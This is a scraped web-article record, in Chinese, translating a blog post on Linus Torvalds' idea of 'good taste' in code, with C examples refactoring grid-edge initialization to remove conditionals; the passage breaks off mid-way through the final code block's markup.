["http://wx3.sinaimg.cn/large/63918611gy1ffimtsod1tj20d007yabc.jpg"], "fav_nums": 1, "comment_nums": 3, "create_date": "2017/05/12", "praise_nums": 4}
{"tags": " 2 评论 ,代码,开发,Linus Torvalds", "front_image_path": "full/9274d0cae01a507ba2db43fe747fe8174c24fa11.jpg", "title": "向 Linus 学习，让代码具有 good taste", "url_object_id": "8951632453e9593063a817f94e0e4bf8", "url": "http://blog.jobbole.com/111159/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://medium.com/@bartobri/applying-the-linus-tarvolds-good-taste-coding-requirement-99749f37684a\">Brian Barto</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8498-1.html\">Linux中国</a>   </div><p>在<a href=\"https://www.ted.com/talks/linus_torvalds_the_mind_behind_linux\">最近关于 Linus Torvalds 的一个采访中</a>，这位 Linux 的创始人，在采访过程中大约 14:20 的时候，提及了关于代码的 “good taste”。good taste？采访者请他展示更多的细节，于是，Linus Torvalds 展示了一张提前准备好的插图。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffjtjwjg02j20m80ci0tz.jpg\"></p>\n<p>他展示的是一个代码片段。但这段代码并没有 “good taste”。这是一个具有 “poor taste” 的代码片段，把它作为例子，以提供一些初步的比较。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/e22500d419de9fe5192d222fef980a51.png\" alt=\"Poor Taste Code Example\"></p>\n<p>这是一个用 C 写的函数，作用是删除链表中的一个对象，它包含有 10 行代码。</p>\n<p>他把注意力集中在底部的 <code>if</code> 语句。正是这个 <code>if</code> 语句受到他的批判。</p>\n<p>我暂停了这段视频，开始研究幻灯片。我发现我最近有写过和这很像的代码。Linus 不就是在说我的代码品味很差吗？我放下自傲，继续观看视频。</p>\n<p>随后， Linus 向观众解释，正如我们所知道的，当从链表中删除一个对象时，需要考虑两种可能的情况。当所需删除的对象位于链表的表头时，删除过程和位于链表中间的情况不同。这就是这个 <code>if</code> 语句具有 “poor taste” 的原因。</p>\n<p>但既然他承认考虑这两种不同的情况是必要的，那为什么像上面那样写如此糟糕呢？</p>\n<p>接下来，他又向观众展示了第二张幻灯片。这个幻灯片展示的是实现同样功能的一个函数，但这段代码具有 “goog taste”　。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/e7c9836afc370ab34c38a7f9fe10d051.png\" alt=\"Good Taste Code Example\"></p>\n<p>原先的 10 行代码现在减少为 4 行。</p>\n<p>但代码的行数并不重要，关键是 <code>if</code> 语句，它不见了，因为不再需要了。代码已经被重构，所以，不用管对象在列表中的位置，都可以运用同样的操作把它删除。</p>\n<p>Linus 解释了一下新的代码，它消除了边缘情况，就是这样。然后采访转入了下一个话题。</p>\n<p>我琢磨了一会这段代码。 Linus 是对的，的确，第二个函数更好。如果这是一个确定代码具有 “good taste” 还是 “bad taste” 的测试，那么很遗憾，我失败了。我从未想到过有可能能够去除条件语句。我写过不止一次这样的 <code>if</code> 语句，因为我经常使用链表。</p>\n<p>这个例子的意义，不仅仅是教给了我们一个从链表中删除对象的更好方法，而是启发了我们去思考自己写的代码。你通过程序实现的一个简单算法，可能还有改进的空间，只是你从来没有考虑过。</p>\n<p>以这种方式，我回去审查最近正在做的项目的代码。也许是一个巧合，刚好也是用 C 写的。</p>\n<p>我尽最大的能力去审查代码，“good taste” 的一个基本要求是关于边缘情况的消除方法，通常我们会使用条件语句来消除边缘情况。你的测试使用的条件语句越少，你的代码就会有更好的 “taste” 。</p>\n<p>下面，我将分享一个通过审查代码进行了改进的一个特殊例子。</p>\n<p>这是一个关于初始化网格边缘的算法。</p>\n<p>下面所写的是一个用来初始化网格边缘的算法，网格 grid 以一个二维数组表示：grid[行][列] 。</p>\n<p>再次说明，这段代码的目的只是用来初始化位于 grid 边缘的点的值，所以，只需要给最上方一行、最下方一行、最左边一列以及最右边一列赋值即可。</p>\n<p>为了完成这件事，我通过循环遍历 grid 中的每一个点，然后使用条件语句来测试该点是否位于边缘。代码看起来就是下面这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef3c328797261997\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfor (r = 0; r &lt; GRID_SIZE; ++r) {\r\n    for (c = 0; c &lt; GRID_SIZE; ++c) {\r\n        // Top Edge\r\n        if (r == 0)\r\n            grid[r][c] = 0;\r\n        // Left Edge\r\n        if (c == 0)\r\n            grid[r][c] = 0;\r\n        // Right Edge\r\n        if (c == GRID_SIZE - 1)\r\n            grid[r][c] = 0;\r\n        // Bottom Edge\r\n        if (r == GRID_SIZE - 1)\r\n            grid[r][c] = 0;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c328797261997-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c328797261997-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c328797261997-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c328797261997-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c328797261997-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c328797261997-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c328797261997-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c328797261997-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c328797261997-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c328797261997-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c328797261997-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c328797261997-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c328797261997-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c328797261997-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c328797261997-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c328797261997-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef3c328797261997-1\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c328797261997-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c328797261997-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Top Edge</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c328797261997-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c328797261997-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c328797261997-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Left Edge</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c328797261997-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c328797261997-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c328797261997-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Right Edge</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c328797261997-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c328797261997-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c328797261997-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Bottom Edge</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c328797261997-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c328797261997-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c328797261997-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c328797261997-16\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0033 seconds] -->\r\n<p>虽然这样做是对的，但回过头来看，这个结构存在一些问题。</p>\n<ol>\n<li>复杂性 — 在双层循环里面使用 4 个条件语句似乎过于复杂。</li>\n<li>高效性 — 假设 <code>GRID_SIZE</code> 的值为 64，那么这个循环需要执行 4096 次，但需要进行赋值的只有位于边缘的 256 个点。</li>\n</ol>\n<p>用 Linus 的眼光来看，将会认为这段代码没有 “good taste” 。</p>\n<p>所以，我对上面的问题进行了一下思考。经过一番思考，我把复杂度减少为包含四个条件语句的单层 <code>for</code> 循环。虽然只是稍微改进了一下复杂性，但在性能上也有了极大的提高，因为它只是沿着边缘的点进行了 256 次循环。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef3c357584543828\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfor (i = 0; i &lt; GRID_SIZE * 4; ++i) {\r\n    // Top Edge\r\n    if (i &lt; GRID_SIZE)\r\n        grid[0][i] = 0;\r\n    // Right Edge\r\n    else if (i &lt; GRID_SIZE * 2)\r\n        grid[i - GRID_SIZE][GRID_SIZE - 1] = 0;\r\n    // Left Edge\r\n    else if (i &lt; GRID_SIZE * 3)\r\n        grid[i - (GRID_SIZE * 2)][0] = 0;\r\n    // Bottom Edge\r\n    else\r\n        grid[GRID_SIZE - 1][i - (GRID_SIZE * 3)] = 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c357584543828-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c357584543828-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c357584543828-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c357584543828-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c357584543828-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c357584543828-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c357584543828-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c357584543828-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c357584543828-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c357584543828-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c357584543828-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c357584543828-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c357584543828-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c357584543828-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef3c357584543828-1\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">GRID_SIZE *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c357584543828-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Top Edge</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c357584543828-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c357584543828-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c357584543828-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Right Edge</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c357584543828-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">GRID_SIZE *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c357584543828-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c357584543828-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Left Edge</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c357584543828-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">GRID_SIZE *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c357584543828-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">GRID_SIZE *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c357584543828-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Bottom Edge</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c357584543828-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c357584543828-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">GRID_SIZE *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c357584543828-14\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>的确是一个很大的提高。但是它看起来很丑，并不是易于阅读理解的代码。基于这一点，我并不满意。</p>\n<p>我继续思考，是否可以进一步改进呢？事实上，答案是 YES！最后，我想出了一个非常简单且优雅的算法，老实说，我不敢相信我会花了那么长时间才发现这个算法。</p>\n<p>下面是这段代码的最后版本。它只有一层 <code>for</code> 循环并且没有条件语句。另外。循环只执行了 64 次迭代，极大的改善了复杂性和高效性。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef3c35e887409968\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfor (i = 0; i &lt; GRID_SIZE; ++i) {\r\n    // Top Edge\r\n    grid[0][i] = 0;\r\n    // Bottom Edge\r\n    grid[GRID_SIZE - 1][i] = 0;\r\n    // Left Edge\r\n    grid[i][0] = 0;\r\n    // Right Edge\r\n    grid[i][GRID_SIZE - 1] = 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c35e887409968-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c35e887409968-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c35e887409968-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c35e887409968-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c35e887409968-5\">5</div><div class=\"crayon-num crayon-striped-num\" 